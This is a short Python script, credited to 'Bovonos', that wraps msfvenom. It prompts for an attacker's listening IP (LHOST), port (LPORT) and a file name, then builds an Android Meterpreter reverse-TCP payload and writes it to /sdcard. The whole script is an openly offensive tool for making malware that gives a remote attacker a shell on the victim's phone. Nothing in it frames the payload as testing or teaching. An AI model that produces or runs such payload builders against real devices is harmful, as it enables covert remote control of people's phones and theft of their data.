import os
import time
red = "\033[0;31m"
print (red)
os.system("clear")
print ("by Bovonos")
db_start = ("start")
green = "\033[0;32m"
print (green)
ip = input ("LHOST :")
print ("LHOST => " + ip)
time.sleep(0.5)
print (" ")
port = input ("LPORT :")
print ("LPORT => " + port)
time.sleep(0.5)
print (" ")
name = input ("name of Payload :")
print ("name => " + name)
time.sleep(0.5)
print (" ")
star = input ("TYPE start:")
if star== db_start:
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -o /sdcard/"+name)
    


